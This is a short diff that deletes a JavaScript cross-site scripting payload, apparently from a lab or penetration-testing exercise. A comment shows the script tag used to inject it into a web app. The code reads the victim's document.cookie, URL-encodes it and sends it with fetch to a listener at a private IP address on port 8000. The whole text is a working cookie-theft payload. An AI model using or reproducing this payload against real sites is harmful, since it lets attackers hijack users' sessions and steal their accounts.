@@ -1,6 +1,0 @@
-//payload from webapp : <script src=http://ip:port/filename></script>
-let cookie = document.cookie
-
-let encodedCookie = encodeURIComponent(cookie)
-
-fetch("http://192.168.45.243:8000/exfil?data=" + encodedCookie)
